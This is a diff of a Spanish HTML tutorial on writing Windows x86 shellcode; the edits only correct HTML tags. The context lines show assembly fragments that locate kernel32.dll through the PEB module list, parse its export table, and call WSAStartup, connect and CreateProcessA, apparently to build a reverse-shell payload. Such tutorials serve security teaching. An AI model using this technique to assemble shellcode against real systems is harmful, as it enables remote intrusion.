@@ -239,7 +239,7 @@ mov esi, [eax+0x14]
 lodsd
 xchg eax, esi
 lodsd
-mov ebx, [eax+0x10]</b></pre><br>
+mov ebx, [eax+0x10]</pre><br>
 
 <p><b>lodsd</b> avanza 4 bytes del registro <b>esi</b> a <b>eax</b> en una estructura, así que sería <b>InMemoryOrderModuleList+4 = flink(ntdll.dll)</b></p>
 <p>Después se hace un xchg para meter <b>eax</b> nuevamente a <b>esi</b> y volvemos a recorrer 4 bytes para quedar <b>InMemoryOrderModuleList+4=flink+4=flink(kernel32.dll)</b> donde se encuentra la dirección que necesitamos para poder llegar a la base de <b>kernel32.dll</b>.</p>
@@ -274,7 +274,7 @@ add edx, ebx
 mov edx, [edx+0x78]
 add edx, ebx
 mov esi, [edx+0x20]
-add esi, ebx</b></pre><br>
+add esi, ebx</pre><br>
 
 <p>Cada movimiento hay que unirlo a la base de kernel32.</p>
 
@@ -369,7 +369,7 @@ push esi
 
 call [ebp-4]  
 
-eax <-- mantiene el resultado</pre>
+eax - mantiene el resultado</pre>
 
 <p>Ya que obtuvimos las direcciones de WSAStartup, debemos empezar con los parámetros.</p>
 
@@ -503,7 +503,7 @@ call [ebp-4] </pre>
   SOCKET         s,
   const sockaddr *name,
   int            namelen
-);</pre><
+);</pre>
 
 <pre>typedef struct sockaddr_in {
 #if ...
@@ -603,7 +603,7 @@ xor edi, edi
 xor edx, edx
 sub esp, 0x16
 mov edx, esp</pre>
-</p>
+
 <p>Y ya al final es solo darle parámetros a CreateProcessA con esto que acabamos de ver según la estructura.</p>
 
 <p>Listo.</p>
